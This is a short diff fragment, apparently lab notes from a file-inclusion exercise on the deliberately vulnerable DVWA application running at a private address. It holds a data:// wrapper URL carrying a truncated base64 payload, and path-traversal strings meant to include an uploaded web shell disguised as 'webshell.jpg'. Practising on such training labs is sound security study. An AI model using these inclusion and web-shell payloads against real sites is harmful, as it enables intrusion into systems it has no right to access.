@@ -19,3 +19,8 @@ http://192.168.0.106/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9w
 C:\xampp\htdocs\dvwa\vulnerabilities\fi
 
 
+.\..\..\hackable\uploads\webshell.jpg%23webshell 
+
+./../../hackable/uploads/webshell.jpg%23webshell
+
+
